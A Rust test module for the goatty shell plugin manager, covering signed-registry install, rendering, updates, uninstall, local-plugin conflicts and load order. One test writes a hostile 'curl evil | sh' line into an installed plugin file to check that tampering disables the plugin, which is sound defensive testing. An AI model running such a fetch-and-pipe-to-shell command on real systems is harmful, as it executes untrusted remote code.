//! Plugins end to end on a sandboxed host: a signed local registry, a
//! fake download, plan → install → render → uninstall.

use std::collections::BTreeMap;

use goatty_config::{HostSettings, PluginConfig};
use goatty_plugin::fetch::Fixed;

use super::registry::tests::{DEMO, make_registry};
use super::*;

pub(crate) struct World {
    pub tmp: tempfile::TempDir,
    pub dirs: Dirs,
    pub fetch: Fixed,
    pub sources: Vec<Source>,
}

pub(crate) fn targz(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut b = tar::Builder::new(flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast()));
    for (path, data) in files {
        let mut h = tar::Header::new_gnu();
        h.set_size(data.len() as u64);
        h.set_mode(0o755);
        h.set_cksum();
        b.append_data(&mut h, path, *data).unwrap();
    }
    b.into_inner().unwrap().finish().unwrap()
}

/// A host with a registry offering `demo` (a package + alias) and
/// `greet` (shell code, no package).
pub(crate) fn world() -> World {
    let tmp = tempfile::tempdir().unwrap();
    let dirs = Dirs::under(&tmp.path().join("host"));
    let archive = targz(&[("demo", b"#!/bin/sh\necho demo \"$@\"\n")]);
    let demo = DEMO.replace("SHA", &goatty_plugin::bundle::sha256_hex(&archive)).replace("size = 10", &format!("size = {}", archive.len()));
    let greet = r#"
schema = 1
id = "greet"
name = "Greet"
version = "0.1.0"
summary = "Defines a greet function"
publisher = "tests"

[[setting]]
id = "name"
label = "Name"
type = "string"
default = "world"

[zsh]
init = "zsh/init.zsh"

[permissions]
shell-code = "defines the greet function in every shell"
"#;
    let reg = tmp.path().join("registry");
    let (public, _) = make_registry(
        &reg,
        &[
            ("demo", "1.0.0", &demo, &[]),
            ("greet", "0.1.0", greet, &[("zsh/init.zsh", "greet() { print -r -- \"hello $1 from ${goatty_settings[name]}\" }\n")]),
        ],
    );
    let fetch = Fixed([("https://example.com/demo.tar.gz".to_string(), archive)].into());
    let sources = vec![Source { name: "test".into(), url: reg.to_string_lossy().into_owned(), keys: vec![public], builtin: true }];
    World { tmp, dirs, fetch, sources }
}

impl World {
    pub fn plugins(&self) -> Plugins<'_> {
        Plugins { dirs: &self.dirs, fetch: &self.fetch, builtin: &self.sources }
    }
}

/// The installed plugins that don't come with goatty.
fn installed(cat: &Catalog) -> Vec<&Installed> {
    cat.installed.iter().filter(|i| !i.builtin).collect()
}

/// Ids of the active plugins that don't come with goatty.
fn active_ids(dirs: &Dirs, s: &HostSettings) -> Vec<String> {
    super::active(dirs, s).0.into_iter().filter(|a| matches!(a.origin, Origin::Installed(_))).map(|a| a.manifest.id).collect()
}

#[test]
fn plan_install_render_uninstall() {
    let w = world();
    let p = w.plugins();
    let settings = HostSettings::default();

    let cat = p.catalog(false, &settings);
    assert_eq!(cat.registries[0].plugins, 2, "{:?}", cat.registries);
    assert_eq!(cat.available.iter().map(|a| a.id.as_str()).collect::<Vec<_>>(), ["demo", "greet"]);
    assert!(installed(&cat).is_empty());
    assert_eq!(cat.installed.len(), builtins::BUILTINS.len(), "the built-in plugins are always there");

    let c = p.find("demo", None).unwrap();
    let plan = p.plan(&c, &settings).unwrap();
    assert!(plan.verified && plan.replaces.is_none());
    assert_eq!(plan.downloads.len(), 1);
    assert_eq!(plan.aliases, ["d → demo"]);
    assert!(plan.runs_code());

    // A stale approval is refused; the right one installs.
    assert!(p.install(&c, "wrong", &settings).unwrap_err().to_string().contains("changed since you reviewed it"));
    p.install(&c, &plan.digest, &settings).unwrap();
    assert!(w.dirs.bin_dir().join("demo").is_file());
    assert!(lock::bundle_dir(&w.dirs, "demo").join("plugin.toml").is_file());
    let cat = p.catalog(false, &settings);
    assert_eq!(installed(&cat)[0].id, "demo");
    assert_eq!(installed(&cat)[0].packages[0].state, PackageState::Managed { version: "2.0".into() });
    assert_eq!(cat.available[0].installed.as_deref(), Some("1.0.0"));

    // Rendered with the user's setting.
    let mut s = settings.clone();
    s.plugins.insert("demo".into(), PluginConfig { settings: BTreeMap::from([("loud".into(), true.into())]), ..Default::default() });
    let (active, issues) = active(&w.dirs, &s);
    assert!(issues.is_empty(), "{issues:?}");
    let files = crate::zsh::render(&crate::zsh::ZshConfig { settings: &s, dirs: &w.dirs, daemon_exe: None, plugins: &active });
    let main = &files.iter().find(|f| f.name == "plugins.zsh").unwrap().contents;
    assert!(main.contains("alias -- d='demo --loud'"), "{main}");

    // Disabled: installed but not rendered.
    s.plugins.get_mut("demo").unwrap().enabled = false;
    assert!(active_ids(&w.dirs, &s).is_empty());

    p.uninstall("demo").unwrap();
    assert!(!w.dirs.bin_dir().join("demo").exists());
    assert!(!lock::bundle_dir(&w.dirs, "demo").exists());
    assert!(Lock::load(&w.dirs).unwrap().plugins.is_empty());
    assert!(p.uninstall("demo").is_err());
    let (_, issues) = super::active(&w.dirs, &s);
    assert!(issues[0].contains("not installed"), "{issues:?}");
}

#[test]
fn shell_code_is_shown_and_checked() {
    let w = world();
    let p = w.plugins();
    let settings = HostSettings::default();
    let c = p.find("greet", None).unwrap();
    let plan = p.plan(&c, &settings).unwrap();
    let (file, code) = plan.shell_code.clone().unwrap();
    assert_eq!(file, "zsh/init.zsh");
    assert!(code.contains("greet()"));
    assert!(plan.downloads.is_empty());
    p.install(&c, &plan.digest, &settings).unwrap();

    let (active, _) = active(&w.dirs, &settings);
    let files = crate::zsh::render(&crate::zsh::ZshConfig { settings: &settings, dirs: &w.dirs, daemon_exe: None, plugins: &active });
    assert!(files.iter().any(|f| f.name == "plugins/greet/zsh/init.zsh"));

    // Changing an installed file after the fact takes the plugin out.
    std::fs::write(lock::bundle_dir(&w.dirs, "greet").join("zsh/init.zsh"), "curl evil | sh\n").unwrap();
    let (_, issues) = super::active(&w.dirs, &settings);
    assert!(active_ids(&w.dirs, &settings).is_empty());
    assert!(issues[0].contains("changed after it was installed"), "{issues:?}");
}

#[test]
fn local_plugins_are_flagged_and_conflicts_refused() {
    let w = world();
    let p = w.plugins();
    let settings = HostSettings::default();
    let dir = w.tmp.path().join("mine");
    std::fs::create_dir_all(&dir).unwrap();
    // A local plugin that wants to provide `starship` (a built-in tool).
    let text = std::fs::read_to_string(w.tmp.path().join("registry/plugins/demo/1.0.0/plugin.toml")).unwrap();
    std::fs::write(
        dir.join("plugin.toml"),
        text.replace("id = \"demo\"\nname", "id = \"mine\"\nname")
            .replace("bin = [\"demo\"]", "bin = [\"starship\"]")
            .replace("command = \"demo\"", "command = \"starship\""),
    )
    .unwrap();
    let c = Candidate::local(&dir).unwrap();
    let err = p.plan(&c, &settings).unwrap_err().to_string();
    assert!(err.contains("starship comes with goatty's built-in starship plugin"), "{err}");

    std::fs::write(dir.join("plugin.toml"), text.replace("id = \"demo\"\nname", "id = \"mine\"\nname")).unwrap();
    let c = Candidate::local(&dir).unwrap();
    let plan = p.plan(&c, &settings).unwrap();
    assert!(!plan.verified);
    assert!(plan.warnings[0].contains("Not from a registry"), "{:?}", plan.warnings);
    p.install(&c, &plan.digest, &settings).unwrap();
    assert_eq!(Lock::load(&w.dirs).unwrap().plugins["mine"].source, "local");

    // The registry's demo now conflicts on bin/demo.
    let demo = p.find("demo", None).unwrap();
    assert!(p.plan(&demo, &settings).unwrap_err().to_string().contains("already provided by the mine plugin"));
}

#[test]
fn update_replaces_version_and_packages() {
    let w = world();
    let p = w.plugins();
    let settings = HostSettings::default();
    let c = p.find("demo", None).unwrap();
    let plan = p.plan(&c, &settings).unwrap();
    p.install(&c, &plan.digest, &settings).unwrap();

    // Publish 1.1.0 with a new package version.
    let reg = w.tmp.path().join("registry");
    let archive = targz(&[("demo", b"#!/bin/sh\necho demo2\n")]);
    let text = std::fs::read_to_string(reg.join("plugins/demo/1.0.0/plugin.toml")).unwrap();
    let old_sha = text.split("sha256 = \"").nth(1).unwrap()[..64].to_string();
    let v2 = text
        .replace("version = \"1.0.0\"", "version = \"1.1.0\"")
        .replace("version = \"2.0\"", "version = \"2.1\"")
        .replace(&old_sha, &goatty_plugin::bundle::sha256_hex(&archive))
        .replace("demo.tar.gz", "demo-2.1.tar.gz");
    std::fs::create_dir_all(reg.join("plugins/demo/1.1.0")).unwrap();
    std::fs::write(reg.join("plugins/demo/1.1.0/plugin.toml"), v2).unwrap();
    let key = ed25519_dalek::SigningKey::from_bytes(&[42; 32]);
    super::registry::tests::publish(&reg, &key);
    let mut fetch = w.fetch.clone();
    fetch.0.insert("https://example.com/demo-2.1.tar.gz".into(), archive);
    let p = Plugins { dirs: &w.dirs, fetch: &fetch, builtin: &w.sources };

    let cat = p.catalog(true, &settings);
    assert_eq!(installed(&cat)[0].update.as_deref(), Some("1.1.0"));
    let c2 = p.find("demo", None).unwrap();
    let plan2 = p.plan(&c2, &settings).unwrap();
    assert_eq!(plan2.replaces.as_deref(), Some("1.0.0"));
    p.install(&c2, &plan2.digest, &settings).unwrap();
    assert!(w.dirs.tools_dir().join("demo/2.1").is_dir());
    assert!(!w.dirs.tools_dir().join("demo/2.0").exists());
    assert_eq!(std::fs::read_to_string(w.dirs.bin_dir().join("demo")).unwrap(), "#!/bin/sh\necho demo2\n");
    assert!(installed(&p.catalog(false, &settings))[0].update.is_none());
}

#[test]
fn builtin_plugins_install_only_their_packages() {
    let w = world();
    let mut fetch = w.fetch.clone();
    let archive = targz(&[("zsh-autosuggestions-0.7.1/zsh-autosuggestions.zsh", b"suggest_loaded=1\n")]);
    let b = builtins::get("autosuggestions").unwrap();
    // The real pin's checksum can't match a test archive: plan against a copy with this one's.
    let mut c = Candidate::builtin(b);
    let pkg = &mut c.manifest.packages[0];
    pkg.system_paths.clear(); // the host's distro copy mustn't count here
    pkg.assets[0].sha256 = goatty_plugin::bundle::sha256_hex(&archive);
    fetch.0.insert(pkg.assets[0].url.clone(), archive);
    let p = Plugins { dirs: &w.dirs, fetch: &fetch, builtin: &w.sources };
    let settings = HostSettings::default();

    assert!(p.find("autosuggestions", Some("9.9.9")).is_err(), "other versions come with other goatty releases");
    let plan = p.plan(&c, &settings).unwrap();
    assert!(plan.builtin && plan.verified && plan.replaces.is_none());
    assert_eq!(plan.source, "goatty");
    let d = &plan.downloads[0];
    assert!(d.fetches() && d.script.as_deref() == Some("zsh-autosuggestions.zsh"), "{d:?}");
    assert!(plan.shell_code.as_ref().unwrap().1.contains("ZSH_AUTOSUGGEST_STRATEGY"));

    p.install(&c, &plan.digest, &settings).unwrap();
    assert!(w.dirs.plugins_dir().join("autosuggestions/zsh-autosuggestions.zsh").is_file());
    assert!(Lock::load(&w.dirs).unwrap().plugins.is_empty(), "built-in plugins have no lock entry");
    assert!(!lock::bundle_dir(&w.dirs, "autosuggestions").exists(), "nor copied files");

    // Planned again: nothing left to download.
    let again = p.plan(&c, &settings).unwrap();
    assert!(again.downloads[0].current && !again.downloads[0].fetches());
    assert_eq!(again.download_size(), 0);

    // Uninstalling isn't a thing; removing the download is.
    assert!(p.uninstall("autosuggestions").unwrap_err().to_string().contains("turn it off instead"));
    assert_eq!(p.remove_packages(b).unwrap(), ["autosuggestions"]);
    assert!(!w.dirs.plugins_dir().join("autosuggestions").exists());
    assert!(p.remove_packages(b).unwrap().is_empty());
}

#[test]
fn registry_plugins_cannot_shadow_builtins() {
    let w = world();
    let p = w.plugins();
    let settings = HostSettings::default();
    let dir = w.tmp.path().join("fake-atuin");
    std::fs::create_dir_all(&dir).unwrap();
    let text = std::fs::read_to_string(w.tmp.path().join("registry/plugins/demo/1.0.0/plugin.toml")).unwrap();
    std::fs::write(dir.join("plugin.toml"), text.replace("id = \"demo\"\nname", "id = \"atuin\"\nname")).unwrap();
    let err = p.plan(&Candidate::local(&dir).unwrap(), &settings).unwrap_err().to_string();
    assert!(err.contains("comes with goatty"), "{err}");
    // A package id of a built-in plugin (tools/<id>/ is theirs).
    std::fs::write(
        dir.join("plugin.toml"),
        text.replace("id = \"demo\"\nname", "id = \"mine\"\nname")
            .replace("id = \"demo\"\nversion = \"2.0\"", "id = \"fzf\"\nversion = \"2.0\""),
    )
    .unwrap();
    let err = p.plan(&Candidate::local(&dir).unwrap(), &settings).unwrap_err().to_string();
    assert!(err.contains("belongs to goatty's built-in fzf plugin"), "{err}");
    // `find` always resolves a built-in id to the built-in plugin.
    assert!(p.find("atuin", None).unwrap().builtin.is_some());
}

#[test]
fn builtins_are_active_unless_turned_off_and_ordered() {
    let w = world();
    let mut s = HostSettings::default();
    let ids = |s: &HostSettings| super::active(&w.dirs, s).0.into_iter().map(|a| a.manifest.id).collect::<Vec<_>>();
    assert_eq!(ids(&s), ["fzf", "atuin", "autosuggestions", "starship", "syntax-highlighting"]);
    s.edit_plugin("atuin", |c| c.enabled = false);
    assert_eq!(ids(&s), ["fzf", "autosuggestions", "starship", "syntax-highlighting"]);
    let (_, issues) = super::active(&w.dirs, &s);
    assert!(issues.is_empty(), "settings for built-in plugins aren't 'not installed': {issues:?}");

    // `after` within a slot, whatever order they come in; a cycle doesn't hang.
    let mut list = super::active(&w.dirs, &HostSettings::default()).0;
    list.reverse();
    let order: Vec<String> = load_order(list.clone()).into_iter().map(|a| a.manifest.id).collect();
    let pos = |id: &str| order.iter().position(|x| x == id).unwrap();
    assert!(pos("fzf") < pos("atuin") && pos("atuin") < pos("autosuggestions"), "{order:?}");
    assert_eq!(order.last().map(String::as_str), Some("syntax-highlighting"));
    for a in &mut list {
        if a.manifest.id == "fzf" {
            a.manifest.zsh.after = vec!["autosuggestions".into()];
        }
    }
    assert_eq!(load_order(list).len(), 5);
}
